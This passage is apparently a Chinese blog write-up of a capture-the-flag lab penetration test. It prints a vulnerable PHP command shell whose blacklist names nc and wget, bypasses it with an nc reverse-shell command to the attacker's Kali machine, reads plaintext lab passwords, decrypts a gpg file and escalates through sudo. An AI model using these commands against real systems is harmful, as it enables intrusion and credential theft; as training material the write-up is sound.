<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">//init</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">invalid = 0;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="built_in">command</span> = (<span class="variable">$_POST</span>[<span class="string">&#x27;in_command&#x27;</span>]);</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">bad_words = array(<span class="string">&quot;pwd&quot;</span>, <span class="string">&quot;ls&quot;</span>, <span class="string">&quot;netcat&quot;</span>, <span class="string">&quot;ssh&quot;</span>, <span class="string">&quot;wget&quot;</span>, <span class="string">&quot;ping&quot;</span>, <span class="string">&quot;traceroute&quot;</span>, <span class="string">&quot;cat&quot;</span>, <span class="string">&quot;nc&quot;</span>);</span></span><br><span class="line">?&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">back&#123;</span></span><br><span class="line">position: fixed;</span><br><span class="line">top: 0;</span><br><span class="line">left: 0;</span><br><span class="line">min-width: 100%;</span><br><span class="line">min-height: 100%;</span><br><span class="line">z-index:-10</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">shell&#123;</span></span><br><span class="line">color: white;</span><br><span class="line">text-align: center;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;div id=&quot;shell&quot;&gt;</span><br><span class="line">&lt;h2&gt;</span><br><span class="line">dev_shell</span><br><span class="line">&lt;/h2&gt;</span><br><span class="line">&lt;form action=&quot;dev_shell.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">Command: &lt;input type=&quot;text&quot; name=&quot;in_command&quot; /&gt; &lt;br&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;h5&gt;Output:&lt;/h5&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">system(&quot;running command...&quot;);</span><br><span class="line">//executes system Command</span><br><span class="line">//checks for sneaky ;</span><br><span class="line">if (strpos($command, &#x27;;&#x27;) !==false)&#123;</span><br><span class="line">system(&quot;echo Nice try skid, but you will never get through this bulletproof php code&quot;); //doesn&#x27;t work :P</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">is_he_a_bad_man = explode(<span class="string">&#x27; &#x27;</span>, trim(<span class="variable">$command</span>));</span></span><br><span class="line">//checks for dangerous commands</span><br><span class="line">if (in_array($is_he_a_bad_man[0], $bad_words))&#123;</span><br><span class="line"> system(&quot;echo Get out skid lol&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line"><span class="meta prompt_"> system($</span><span class="language-bash">_POST[<span class="string">&#x27;in_command&#x27;</span>]);</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;img src=&quot;dev_shell_back.png&quot; id=&quot;back&quot; alt=&quot;&quot;&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</blockquote>
<p><strong>代码审计</strong>：根据代码审计发现黑名单，发现nc被过滤了，可以尝试绕过黑名单</p>
<p><strong>反弹shell</strong>：之前网站页面内容中有透露网页存在shell且做了加固。因此我们需要提升权限，使用工具<code>nc</code>反弹shell，在抓包工具BP页面将输入更改为/<code>bin/nc -e /bin/bash 192.168.244.132 8888</code>，该IP为Kali的IP，因为我们需要让网页向Kali发送response，send一下，在命令行中查收结果，此时反弹shell成功，可以查看ls等黑名单中的命令。使用命令id可以看到我们拿到了用户<code>www-data</code>的shell。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 7777</span><br><span class="line"></span><br><span class="line">in_command=/bin/nc -e /bin/bash 192.168.233.135 7777</span><br></pre></td></tr></table></figure>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104144346262.png" class="" title="image-20240104144346262">
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># nc -lvvp 7777</span></span><br><span class="line">listening on [any] 7777 ...</span><br><span class="line">192.168.233.138: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.233.135] from (UNKNOWN) [192.168.233.138] 50180</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">WIP.jpg</span><br><span class="line">about.html</span><br><span class="line">contact.html</span><br><span class="line">dev_shell.php</span><br><span class="line">dev_shell.php.bak</span><br><span class="line">dev_shell_back.png</span><br><span class="line">index.html</span><br><span class="line">index.html.bak</span><br><span class="line">lat_memo.html</span><br><span class="line">login.html</span><br><span class="line">news.html</span><br><span class="line">passwords.html</span><br><span class="line">robots.txt</span><br><span class="line">school_badge.png</span><br><span class="line"><span class="built_in">id</span> </span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data),100(<span class="built_in">users</span>)</span><br></pre></td></tr></table></figure>
<p><strong>进入交互式shell</strong>：使用Python的模块调用bash，前提是目标靶机有Python</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104145017010.png" class="" title="image-20240104145017010">
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104145328639.png" class="" title="image-20240104145328639">
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span>/</span><br><span class="line">bash: <span class="built_in">cd</span>/: No such file or directory</span><br><span class="line">www-data@Milburg-High:/var/www/html$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">WIP.jpg        dev_shell.php.bak   lat_memo.html   robots.txt</span><br><span class="line">about.html     dev_shell_back.png  login.html      school_badge.png</span><br><span class="line">contact.html   index.html          news.html</span><br><span class="line">dev_shell.php  index.html.bak      passwords.html</span><br><span class="line">www-data@Milburg-High:/var/www/html$ <span class="built_in">cat</span> flag.txt </span><br><span class="line"><span class="built_in">cat</span> flag.txt</span><br><span class="line"><span class="built_in">cat</span>: flag.txt: No such file or directory</span><br><span class="line">www-data@Milburg-High:/var/www/html$ <span class="built_in">cd</span> ../../</span><br><span class="line"><span class="built_in">cd</span> ../../</span><br><span class="line">www-data@Milburg-High:/var$ <span class="built_in">cd</span> ../</span><br><span class="line"><span class="built_in">cd</span> ../</span><br><span class="line">www-data@Milburg-High:/$ <span class="built_in">ls</span> -a</span><br><span class="line"><span class="built_in">ls</span> -a</span><br><span class="line">.    boot  flag.txt    initrd.img.old  lost+found  opt   run   sys  var</span><br><span class="line">..   dev   home        lib             media       proc  sbin  tmp  vmlinuz</span><br><span class="line">bin  etc   initrd.img  lib64           mnt         root  srv   usr  vmlinuz.old</span><br><span class="line">www-data@Milburg-High:/$ <span class="built_in">cat</span> flag.txt</span><br><span class="line"><span class="built_in">cat</span> flag.txt</span><br><span class="line"><span class="built_in">cat</span>: flag.txt: Permission denied</span><br></pre></td></tr></table></figure>
<p>浏览根目录文件找到flag.txt，flag.txt只有管理员有读写权限，so我们需要拿到管理员权限。在<code>etc</code>目录下发现了文件passwd，查看该文件，文件中包含用户名信息，其中就有Bob用户，通过网站页面信息了解到Bob可能是管理员。因此紧接着浏览bob的家目录，发现隐藏敏感文件<code>.old_passwordfile.html</code>，查看该文件发现了<code>jc</code>和<code>seb</code>的账号密码。</p>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104160041914.png" class="" title="image-20240104160041914">
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">www-data@Milburg-High:/home/bob$ cat .old_passwordfile.html</span><br><span class="line">cat .old_passwordfile.html</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;</span><br><span class="line">jc:Qwerty</span><br><span class="line">seb:T1tanium_Pa$$word_Hack3rs_Fear_M3</span><br><span class="line">&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104160633573.png" class="" title="image-20240104160633573">
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">jc@Milburg-High:/home/bob$ <span class="built_in">cd</span> /home/bob/</span><br><span class="line"><span class="built_in">cd</span> /home/bob/</span><br><span class="line">jc@Milburg-High:/home/bob$ <span class="built_in">ls</span> -l</span><br><span class="line"><span class="built_in">ls</span> -l</span><br><span class="line">total 32</span><br><span class="line">drwxr-xr-x 2 bob bob 4096 Feb 21  2018 Desktop</span><br><span class="line">drwxr-xr-x 3 bob bob 4096 Mar  5  2018 Documents</span><br><span class="line">drwxr-xr-x 3 bob bob 4096 Mar  8  2018 Downloads</span><br><span class="line">drwxr-xr-x 2 bob bob 4096 Feb 21  2018 Music</span><br><span class="line">drwxr-xr-x 2 bob bob 4096 Feb 21  2018 Pictures</span><br><span class="line">drwxr-xr-x 2 bob bob 4096 Feb 21  2018 Public</span><br><span class="line">drwxr-xr-x 2 bob bob 4096 Feb 21  2018 Templates</span><br><span class="line">drwxr-xr-x 2 bob bob 4096 Feb 21  2018 Videos</span><br><span class="line">jc@Milburg-High:/home/bob$ <span class="built_in">cd</span> Documents</span><br><span class="line"><span class="built_in">cd</span> Documents</span><br><span class="line">jc@Milburg-High:/home/bob/Documents$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">login.txt.gpg  Secret  staff.txt</span><br><span class="line">jc@Milburg-High:/home/bob/Documents$ <span class="built_in">cat</span> login.txt.gpg</span><br><span class="line"><span class="built_in">cat</span> login.txt.gpg</span><br><span class="line">o��J[V0w�q�OS����@P�i4��u</span><br><span class="line">                         E,����8=kj�Z����9`�5G��4��!�����!�����Q:�1���Q�jc@Milburg-High:/home/bob/Documents$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>解密<code>gpg</code>文件</strong><br>登上<code>jc</code>账号，浏览其家目录，没找到有用信息，保持旺盛的好奇心，浏览对方所有文件，搜集有用信息，最终我们在Bob家目录的documents中找到了文件<code>login.txt.gpg</code>（<code>gpg</code>是<code>linux</code>的加密格式），需要将该文件解密后查看。<br>解密<code>gpg</code>文件：查看Bob家目录的documents中的Secret文件夹，发现了文件<code>notes.sh</code>（<code>sh</code>后缀为<code>linux</code>下的shell脚本文件）查看该内容后开始猜测其含义，最终确定这是藏头诗，找到了密钥（<strong>HARPOCRATES</strong>），破解文件<code>login.txt.gpg</code>，并查看该文件内容。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;uments/Secret/Keep_Out/Not_Porn/No_Lookie_In_Here$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">notes.sh</span><br><span class="line">&lt;uments/Secret/Keep_Out/Not_Porn/No_Lookie_In_Here$ ./notes.sh</span><br><span class="line">./notes.sh</span><br><span class="line">TERM environment variable not <span class="built_in">set</span>.</span><br><span class="line">-= Notes =-</span><br><span class="line">Harry Potter is my faviorite</span><br><span class="line">Are you the real me?</span><br><span class="line">Right, I<span class="string">&#x27;m ordering pizza this is going nowhere</span></span><br><span class="line"><span class="string">People just don&#x27;</span>t get me</span><br><span class="line">Ohhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh &lt;sea santy here&gt;</span><br><span class="line">Cucumber</span><br><span class="line">Rest now your eyes are sleepy</span><br><span class="line">Are you gonna stop reading this yet?</span><br><span class="line">Time to fix the server</span><br><span class="line">Everyone is annoying</span><br><span class="line">Sticky notes gotta buy em</span><br><span class="line">&lt;uments/Secret/Keep_Out/Not_Porn/No_Lookie_In_Here$ </span><br></pre></td></tr></table></figure>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104155409288.png" class="" title="image-20240104155409288">
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpg --batch --passphrase HARPOCRATES -d login.txt.gpg</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">jc@Milburg-High:/home/bob/Documents$ gpg --batch --passphrase HARPOCRATES -d login.txt.gpg</span><br><span class="line">&lt;g --batch --passphrase HARPOCRATES -d login.txt.gpg</span><br><span class="line">gpg: keybox <span class="string">&#x27;/home/jc/.gnupg/pubring.kbx&#x27;</span> created</span><br><span class="line">gpg: AES encrypted data</span><br><span class="line">gpg: encrypted with 1 passphrase</span><br><span class="line">bob:b0bcat_</span><br><span class="line">jc@Milburg-High:/home/bob/Documents$</span><br></pre></td></tr></table></figure>
 <img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104161606959.png" class="" title="image-20240104161606959">
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bob@Milburg-High:~/Documents$ <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1001(bob) gid=1001(bob) <span class="built_in">groups</span>=1001(bob),27(sudo)</span><br></pre></td></tr></table></figure>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104161706416.png" class="" title="image-20240104161706416">
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104161832640.png" class="" title="image-20240104161832640">
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">sudo cat /flag.txt</span><br><span class="line">[sudo] password for bob: b0bcat_</span><br><span class="line"></span><br><span class="line">CONGRATS ON GAINING ROOT</span><br><span class="line"></span><br><span class="line">        .-.</span><br><span class="line">       (   )</span><br><span class="line">        |~|       _.--._</span><br><span class="line">        |~|~:&#x27;--~&#x27;      |</span><br><span class="line">        | | :   #root   |</span><br><span class="line">        | | :     _.--._|</span><br><span class="line">        |~|~`&#x27;--~&#x27;</span><br><span class="line">        | |</span><br><span class="line">        | |</span><br><span class="line">        | |</span><br><span class="line">        | |</span><br><span class="line">        | |</span><br><span class="line">        | |</span><br><span class="line">        | |</span><br><span class="line">        | |</span><br><span class="line">        | |</span><br><span class="line"></span><br><span class="line">   _____|_|_________ Thanks for playing ~c0rruptedb1t</span><br></pre></td></tr></table></figure>
<h4 id="三、总结-1"><a href="#三、总结-1" class="headerlink" title="三、总结"></a>三、总结</h4><p>通过本次实训，我们全面了解了渗透测试的基本流程和操作方法。从初步的信息收集到最终获取目标主机的控制权，每一步都是为了更深入地理解目标系统的安全漏洞。通过这次实验，不仅加深了对理论知识的理解，还提高了实际操作能力。实训中使用的工具和技术，如<code>Nmap、Nikto、Burp Suite</code>等，是网络安全领域的基石，掌握这些工具对于未来的安全研究和职业生涯至关重要。</p>
<p>此外，实训也强调了进行渗透测试时的道德和法律责任。所有测试活动都应在合法和道德的范围内进行。总之，本次实训不仅提高了技术技能，也增进了对网络安全重要性的认识。</p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>请我一杯咖啡吧！</div>
  <button>
    赞赏
  </button>
  <div class="post-reward">
      <div>
        <img src="https://raw.githubusercontent.com/moyuan10086/photo/main/alipay.jpg" alt="moyuan 支付宝">
        <span>支付宝</span>
      </div>

  </div>
</div>

          <div class="followme">
  <span>欢迎关注我的其它发布渠道</span>

  <div class="social-list">

      <div class="social-item">
          <span class="social-link">
            <span class="icon">
              <i class="fab fa-weixin"></i>
            </span>

            <span class="label">WeChat</span>
          </span>

          <img class="social-item-img" src="https://raw.githubusercontent.com/moyuan10086/photo/main/Wechat.jpg">
      </div>
  </div>
</div>

          <div class="post-tags">
              <a href="/tags/%E6%BA%A2%E5%87%BA/" rel="tag"># 溢出</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
            </div>
            <div class="post-nav-item">
                <a href="/2024/07/20/%E5%AF%86%E7%A0%81%E5%AD%A6/" rel="next" title="密码学">
                  密码学 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 2023 – 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">我是 墨鸢（作为一名网络安全工程师来说要有一个虚拟名字，来保护自己的隐私性(～￣▽￣)～）</span>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>

  






  




  

  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"all","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
<script src="/js/third-party/math/mathjax.js"></script>



</body>
</html>
